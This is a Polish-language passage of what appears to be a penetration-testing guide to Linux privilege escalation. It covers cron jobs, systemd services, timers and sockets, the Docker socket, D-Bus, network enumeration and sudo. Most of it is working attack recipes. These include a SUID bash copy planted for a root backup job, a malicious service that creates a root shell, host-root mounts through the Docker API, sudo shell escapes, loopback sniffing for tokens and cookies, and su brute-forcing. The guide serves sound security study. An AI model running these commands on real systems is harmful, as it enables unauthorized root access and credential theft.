Działająca podmiana została podpisana przy użyciu wykradzionych prywatnych materiałów podpisujących i narzędzia ELF signer. [Dokumentacja formatu](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) opisuje sekcję podpisu pochodzącą z `.text` pliku wykonywalnego. Samo dodanie certyfikatu lub pasującego ciągu do `.text_sig` nie dowodzi, że spełnia to wymagania niewidocznego weryfikatora. Przed stwierdzeniem, że zapisywalne, podpisane binarium można wykorzystać do eskalacji uprawnień, sprawdź rzeczywistą ścieżkę używaną przez cron, efektywne uprawnienia zapisu, uruchomienie przez roota i zasady weryfikatora. Sama sekcja `.text_sig` to jedynie wskazówka do dalszej analizy.

### Często uruchamiane zadania cron

Możesz monitorować procesy, aby wyszukać te uruchamiane co 1, 2 lub 5 minut. Być może uda Ci się to wykorzystać do eskalacji uprawnień.

Na przykład, aby **monitorować co 0,1 s przez 1 minutę**, **posortować według najmniejszej liczby uruchomień poleceń** i usunąć polecenia, które uruchomiono najczęściej, możesz wykonać:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wyświetlać każdy uruchamiany proces).

### Kopie zapasowe roota zachowujące ustawione przez atakującego bity uprawnień (pg_basebackup)

Jeśli cron należący do roota uruchamia `pg_basebackup` (lub dowolne rekurencyjne kopiowanie) dla katalogu bazy danych, do którego masz prawo zapisu, możesz umieścić tam **plik binarny SUID/SGID**, który zostanie skopiowany ponownie jako **root:root**, z zachowaniem tych samych bitów uprawnień w katalogu kopii zapasowej.<sup>[[26]](#references)</sup>

Typowy przebieg wykrywania (jako użytkownik DB o niskich uprawnieniach):
- Użyj `pspy`, aby zauważyć cron roota wywołujący co minutę coś w rodzaju `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potwierdź, że możesz zapisywać w katalogu klastra źródłowego (np. `/var/lib/postgresql/14/main`), a katalog docelowy (`/opt/backups/current`) po wykonaniu zadania należy do roota.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Działa to dlatego, że `pg_basebackup` zachowuje bity trybu plików podczas kopiowania klastra; gdy jest uruchamiane przez roota, pliki docelowe dziedziczą **własność roota + wybrane przez atakującego bity SUID/SGID**. Podatna jest każda podobna uprzywilejowana procedura tworzenia kopii zapasowej lub kopiowania, która zachowuje uprawnienia i zapisuje pliki w lokalizacji, z której można je uruchomić.

### Niewidoczne zadania cron

Można utworzyć zadanie cron, **umieszczając znak powrotu karetki po komentarzu** (bez znaku nowej linii); zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Aby wykryć tego rodzaju ukryty wpis, sprawdź pliki cron za pomocą narzędzi ujawniających znaki sterujące:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Usługi

### Zapisywalne pliki _.service_

Sprawdź, czy możesz zapisywać do dowolnego pliku `.service`. Jeśli tak, **możesz go zmodyfikować**, aby **uruchamiał** twojego **backdoora, gdy** usługa zostanie **uruchomiona**, **uruchomiona ponownie** lub **zatrzymana** (być może trzeba będzie poczekać na ponowne uruchomienie maszyny).\
Na przykład utwórz backdoora w pliku .service, dodając **`ExecStart=/tmp/script.sh`**

### Zapisywalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia do zapisu do plików binarnych uruchamianych przez usługi**, możesz zastąpić je backdoorami, aby backdoory uruchomiły się przy ponownym uruchomieniu usług.

### systemd PATH — ścieżki względne

Możesz sprawdzić PATH używany przez **systemd** za pomocą:

```bash
systemctl show-environment
```

Jeśli okaże się, że możesz **zapisywać** w którymkolwiek folderze ścieżki, możesz być w stanie **eskalować uprawnienia**. Należy szukać **ścieżek względnych używanych w plikach konfiguracji usług**, takich jak:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Następnie utwórz **plik wykonywalny** o **takiej samej nazwie jak plik binarny ze ścieżki względnej** w zapisywalnym przez Ciebie katalogu systemd PATH. Gdy usługa będzie próbowała wykonać podatne działanie (**Start**, **Stop**, **Reload**), zostanie uruchomiony Twój **backdoor** (nieuprzywilejowani użytkownicy zwykle nie mogą uruchamiać ani zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Więcej informacji o usługach znajdziesz w `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**` i które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą służyć jako alternatywa dla crona, ponieważ mają wbudowaną obsługę zdarzeń opartych na czasie kalendarzowym i monotonicznym oraz mogą działać asynchronicznie.

Możesz wyliczyć wszystkie timery za pomocą:

```bash
systemctl list-timers --all
```

### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi jeden z elementów systemd.unit (np. `.service` lub `.target`).

```bash
Unit=backdoor.service
```

W dokumentacji możesz przeczytać, czym jest jednostka:

> Jednostka, która ma zostać aktywowana po upływie tego czasu. Argumentem jest nazwa jednostki bez przyrostka „.timer”. Jeśli nie zostanie podana, domyślnie używana jest usługa o tej samej nazwie co jednostka timera, z pominięciem przyrostka. (Zobacz wyżej). Zaleca się, aby nazwa aktywowanej jednostki i nazwa jednostki timera były identyczne, z wyjątkiem przyrostka.

Aby wykorzystać to uprawnienie, musisz:

- Znaleźć jednostkę systemd (np. `.service`), która **uruchamia zapisywalny plik binarny**
- Znaleźć jednostkę systemd, która **uruchamia ścieżkę względną**, oraz mieć **uprawnienia do zapisu do systemowego PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach, używając polecenia `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i musisz wykonać:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w modelu klient-serwer. Do komunikacji między komputerami wykorzystują standardowe pliki deskryptorów Unix i są konfigurowane za pomocą plików `.socket`.<sup>[[14]](#references)</sup>

Sockets można konfigurować za pomocą plików `.socket`.

**Więcej informacji o sockets znajdziesz w `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się od siebie, ale ogólnie służą do **wskazania, gdzie socket będzie nasłuchiwać** (ścieżki do pliku socketu AF_UNIX, adresu IPv4/6 i/lub numeru portu, na którym ma nasłuchiwać itd.)
- `Accept`: Przyjmuje argument logiczny. Jeśli ma wartość **true**, dla każdego połączenia przychodzącego **uruchamiana jest instancja usługi**, której przekazywany jest tylko socket połączenia. Jeśli ma wartość **false**, same sockety nasłuchujące są **przekazywane uruchamianej jednostce usługi**, a dla wszystkich połączeń uruchamiana jest tylko jedna jednostka usługi. Ta wartość jest ignorowana w przypadku socketów datagramowych i FIFO, które zawsze obsługuje jedna jednostka usługi. **Domyślnie jest to false**. Ze względu na wydajność zaleca się tworzenie nowych demonów wyłącznie w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jeden lub więcej wierszy poleceń, które są **wykonywane przed** utworzeniem i powiązaniem **socketów** nasłuchujących/FIFO lub **po tym**, odpowiednio. Pierwszy token wiersza polecenia musi być bezwzględną ścieżką do pliku, po której następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia** wykonywane **przed** zamknięciem i usunięciem **socketów** nasłuchujących/FIFO lub **po tym**, odpowiednio.
- `Service`: Określa nazwę jednostki **usługi do aktywowania** po **otrzymaniu ruchu**. To ustawienie jest dozwolone tylko dla socketów z `Accept=no`. Domyślnie używana jest usługa o tej samej nazwie co socket (ze zmienionym sufiksem). W większości przypadków nie ma potrzeby korzystania z tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w rodzaju: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie uruchomiony przed utworzeniem socketu. Dlatego **prawdopodobnie trzeba będzie poczekać na ponowne uruchomienie maszyny.**\
_Pamiętaj, że system musi korzystać z konfiguracji tego pliku socketu, inaczej backdoor nie zostanie uruchomiony_

### Aktywacja socketu + zapisywalna ścieżka jednostek (utworzenie brakującej usługi)

Inna błędna konfiguracja o dużym wpływie to:

- jednostka socketu z `Accept=no` i `Service=<name>.service`
- brak wskazanej jednostki usługi
- możliwość zapisu przez atakującego w `/etc/systemd/system` (lub innej ścieżce wyszukiwania jednostek)

W takim przypadku atakujący może utworzyć `<name>.service`, a następnie wywołać ruch do socketu, aby systemd załadował i uruchomił nową usługę jako root.

Szybki przebieg:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Zapisywalne gniazda

Jeśli **znajdziesz jakiekolwiek zapisywalne gniazdo** (_mówimy tu o gniazdach Unix, a nie o plikach konfiguracyjnych `.socket`_), **możesz komunikować się** z tym gniazdem i być może wykorzystać podatność.

### Enumerowanie gniazd Unix

```bash
netstat -a -p --unix
```

### Surowe połączenie

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Przykład wykorzystania:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Gniazda HTTP

Zwróć uwagę, że mogą istnieć **gniazda nasłuchujące żądań HTTP** (_nie mówię o plikach .socket, lecz o plikach działających jako gniazda Unix_). Możesz to sprawdzić za pomocą:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Jeśli socket **odpowiada na żądanie HTTP**, możesz się z nim **komunikować** i być może **wykorzystać jakąś podatność**.

### Zapisywalny socket Dockera

Socket Dockera, często znajdujący się w `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie można go zapisywać jako użytkownik `root` oraz członkowie grupy `docker`. Dostęp do zapisu w tym sockecie może prowadzić do eskalacji uprawnień. Poniżej opisano, jak to zrobić, oraz alternatywne metody na wypadek, gdyby Docker CLI nie było dostępne.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz dostęp do zapisu w sockecie Dockera, możesz eskalować uprawnienia za pomocą następujących poleceń:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Te polecenia pozwalają uruchomić kontener z dostępem na poziomie root do systemu plików hosta.

#### **Bezpośrednie użycie Docker API**

Jeśli Docker CLI nie jest dostępny, nadal można nadużyć gniazda Docker, używając surowego HTTP przez gniazdo Unix. Najbardziej niezawodny przebieg wygląda następująco:

- utwórz długotrwały kontener pomocniczy z podmontowanym katalogiem głównym hosta
- uruchom go
- utwórz instancję `exec` wewnątrz tego kontenera
- uruchom instancję `exec` i odczytaj dane wyjściowe za pośrednictwem API

**Wyświetlanie obrazów Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Utwórz i uruchom kontener pomocniczy**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Utwórz instancję exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Uruchom instancję exec i odczytaj dane wyjściowe**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ten wzorzec jest zwykle bardziej niezawodny niż ręczne sterowanie `attach` za pomocą `socat` lub `nc -U`. Gdy możesz utworzyć pomocniczy kontener z `/:/host`, możesz użyć kolejnych instancji `exec`, aby odczytywać pliki, takie jak `/host/root/...`, dodawać klucze SSH w `/host/root/.ssh` lub modyfikować pliki startowe hosta.

### Inne

Pamiętaj, że jeśli masz uprawnienia do zapisu w gnieździe dockera, ponieważ **jesteś członkiem grupy `docker`**, istnieją [**inne sposoby eskalacji uprawnień**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Jeśli [**API dockera nasłuchuje na porcie**, możesz również je skompromitować](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów wydostania się z kontenerów lub nadużycia środowisk uruchomieniowych kontenerów w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacja uprawnień przez Containerd (ctr)

Jeśli okaże się, że możesz użyć polecenia **`ctr`**, przeczytaj następną stronę, ponieważ **możesz być w stanie nadużyć go w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacja uprawnień przez **RunC**

Jeśli okaże się, że możesz użyć polecenia **`runc`**, przeczytaj następną stronę, ponieważ **możesz być w stanie nadużyć go w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom sprawną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, zapewnia solidne środowisko obsługujące różne formy komunikacji między aplikacjami.<sup>[[16]](#references)</sup>

System jest wszechstronny i obsługuje podstawową komunikację IPC, usprawniającą wymianę danych między procesami, podobną do **rozszerzonych gniazd domeny UNIX**. Umożliwia także rozgłaszanie zdarzeń lub sygnałów, ułatwiając płynną integrację komponentów systemu. Na przykład sygnał od demona Bluetooth o połączeniu przychodzącym może spowodować wyciszenie odtwarzacza muzyki, poprawiając komfort użytkowania. Ponadto D-Bus obsługuje system obiektów zdalnych, upraszczając żądania usług i wywołania metod między aplikacjami oraz usprawniając procesy, które tradycyjnie były złożone.

D-Bus działa w oparciu o **model zezwalania/odmawiania**, zarządzając uprawnieniami do wiadomości (wywołań metod, emisji sygnałów itp.) na podstawie łącznego działania pasujących reguł zasad. Zasady te określają interakcje z magistralą i mogą umożliwić eskalację uprawnień przez nadużycie tych uprawnień.

Poniżej przedstawiono przykład takiej zasady z pliku `/etc/dbus-1/system.d/wpa_supplicant.conf`, określającej uprawnienia użytkownika root do posiadania nazwy, wysyłania wiadomości do `fi.w1.wpa_supplicant1` i odbierania od niego wiadomości.

Zasady, w których nie określono użytkownika ani grupy, mają zastosowanie do wszystkich, natomiast zasady kontekstu „default” dotyczą wszystkich przypadków nieobjętych innymi, bardziej szczegółowymi zasadami.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Dowiedz się, jak przeprowadzić enumerację i wykorzystać komunikację D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto przeprowadzić enumerację sieci i ustalić pozycję maszyny.

### Ogólna enumeracja

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Jeśli aktywny wpis `/etc/inetd.conf` uruchamia `telnetd` z GNU Inetutils jako root, sprawdź skonfigurowaną wersję pliku binarnego oraz lokalny listener, nawet jeśli port jest powiązany tylko z loopbackiem. W GNU Inetutils od wersji 1.9.3 do 2.7 występowała luka umożliwiająca ominięcie uwierzytelniania Telnet ([telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89)), przez którą dostarczona przez klienta wartość `USER` trafiała do `login -f` (CVE-2026-24061). Proces lub ciąg wersji to tylko wskaźnik — zanim uznasz usługę za podatną, potwierdź status poprawek dostawcy i sprawdź, jaki daemon faktycznie działa. Więcej informacji zawiera [przewodnik po Telnet](../../../network-services-pentesting/pentesting-telnet.md).

### Szybka analiza filtrowania ruchu wychodzącego

Jeśli host może wykonywać polecenia, ale połączenia zwrotne nie działają, szybko sprawdź osobno filtrowanie DNS, transportu, proxy i tras:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie mogłeś wcześniej wejść w interakcję, zanim uzyskasz do niej dostęp:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klasyfikuj usługi nasłuchujące według adresu, na którym są powiązane:

- `0.0.0.0` / `[::]`: dostępne przez wszystkie lokalne interfejsy.
- `127.0.0.1` / `::1`: dostępne tylko lokalnie (dobrzy kandydaci do tunelowania/przekierowania).
- Konkretne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zwykle osiągalne tylko z segmentów sieci wewnętrznej.

### Wstępna analiza usług dostępnych tylko lokalnie

Po przejęciu hosta usługi powiązane z `127.0.0.1` często po raz pierwszy stają się dostępne z poziomu twojej powłoki. Szybki lokalny sposób postępowania:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS jako skaner sieciowy (tryb tylko sieciowy)

Oprócz lokalnych kontroli PE linPEAS może działać jako wyspecjalizowany skaner sieciowy. Korzysta z dostępnych plików binarnych w `$PATH` (zazwyczaj `fping`, `ping`, `nc`, `ncat`) i nie instaluje żadnych narzędzi.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

If podasz `-d`, `-p` lub `-i` bez `-t`, linPEAS działa jako skaner sieciowy (pomijając pozostałe kontrole eskalacji uprawnień).

### Sniffing

Sprawdź, czy możesz przechwytywać ruch sieciowy. Jeśli tak, możesz być w stanie zdobyć dane uwierzytelniające.

```
timeout 1 tcpdump
```

Szybkie testy praktyczne:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) jest szczególnie cenny podczas post-exploitation, ponieważ wiele usług dostępnych tylko wewnętrznie udostępnia tam tokeny/cookies/dane uwierzytelniające:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Przechwytuj teraz, analizuj później:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Użytkownicy

### Ogólna enumeracja

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** są w systemie, którzy mogą się **login**ować, a którzy mają **uprawnienia root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Wysoki UID

Niektóre wersje Linuksa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** eskalować uprawnienia. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Wykorzystaj błąd** za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem grupy**, która może przyznać Ci uprawnienia roota:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Zasady dotyczące haseł

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Znane hasła

Jeśli **znasz jakiekolwiek hasło** do środowiska, **spróbuj zalogować się jako każdy użytkownik**, używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego hałasu, a na komputerze są dostępne pliki binarne `su` i `timeout`, możesz spróbować przeprowadzić brute-force użytkowników za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli okaże się, że możesz **zapisywać w którymś katalogu ze zmiennej $PATH**, możesz być w stanie eskalować uprawnienia, **tworząc backdoor w zapisywalnym katalogu** pod nazwą polecenia, które ma zostać wykonane przez innego użytkownika (najlepiej roota) i które **nie jest ładowane z katalogu znajdującego się wcześniej w $PATH niż Twój zapisywalny katalog**.

### SUDO i SUID

Możesz mieć możliwość wykonania niektórych poleceń przy użyciu sudo albo mogą one mieć ustawiony bit suid. Sprawdź to za pomocą:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Niektóre **nieoczekiwane polecenia pozwalają odczytywać i/lub zapisywać pliki, a nawet wykonywać polecenia**.<sup>[[8]](#references)</sup> Na przykład:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Konfiguracja sudo może pozwalać użytkownikowi wykonywać niektóre polecenia z uprawnieniami innego użytkownika bez znajomości hasła.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`. Uzyskanie powłoki jest teraz banalnie proste: wystarczy dodać klucz ssh do katalogu `root` lub wywołać `sh`.

```
sudo vim -c '!sh'
```

### Niecytowane porównanie Bash w skrypcie sudo

W Bash prawa strona `[[ "$protected" == $candidate ]]` jest wzorcem. Jeśli skrypt sudo z uprawnieniami roota przypisuje zmiennej `candidate` wartość z pliku kontrolowanego przez wywołującego, wartość taka jak `prefix*` może pasować do początku chronionego ciągu. Różne ścieżki sukcesu i błędu mogą wtedy ujawniać prefiks za pomocą wyroczni. Jeśli zamierzone jest dosłowne porównanie, ujmij prawą stronę w cudzysłowy (`[[ "$protected" == "$candidate" ]]`). Zanim uznasz niecytowane porównanie za możliwe do wykorzystania, sprawdź rzeczywiste argumenty sudo, pochodzenie danych wejściowych oraz obserwowalne zachowanie rozgałęzień. [Podręcznik GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) opisuje to zachowanie wzorców.

### Pliki projektu PrusaSlicer uruchamiane przez sudo

Nieograniczone nadanie przez sudo uprawnień roota do `prusaslicer` lub `prusa-slicer` wymaga sprawdzenia, jeśli wywołujący może wybrać projekt `.3mf` do pocięcia. Projekt może zawierać skrypt przetwarzania końcowego uruchamiany podczas eksportu G-code; spreparowane projekty mogły wykonywać polecenia w PrusaSlicer do wersji 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Zanim uznasz, że można przekroczyć granicę uprawnień, sprawdź obowiązującą regułę sudo, wersję programu i poprawki dostawcy, źródło projektu oraz to, czy wykonywana jest odpowiednia ścieżka eksportu. Stały argument projektu lub skuteczna polityka `NOEXEC` mogą zmienić wynik. Sam fakt zainstalowania slicera nie dowodzi istnienia ścieżki eskalacji uprawnień.

### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania polecenia:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ten przykład, **oparty na maszynie Admirer z HTB**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało załadować dowolną bibliotekę Pythona podczas wykonywania skryptu jako root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Zatruwanie zapisywalnego `__pycache__` / `.pyc` w importach Pythona dozwolonych przez sudo

Jeśli **skrypt Pythona dozwolony przez sudo** importuje moduł, którego katalog pakietu zawiera **zapisywalny `__pycache__`**, możesz być w stanie podmienić plik `.pyc` z cache i uzyskać wykonanie kodu z uprawnieniami uprzywilejowanego użytkownika przy następnym imporcie.<sup>[[30]](#references)</sup>

- Dlaczego to działa:
  - CPython przechowuje cache bytecode w `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
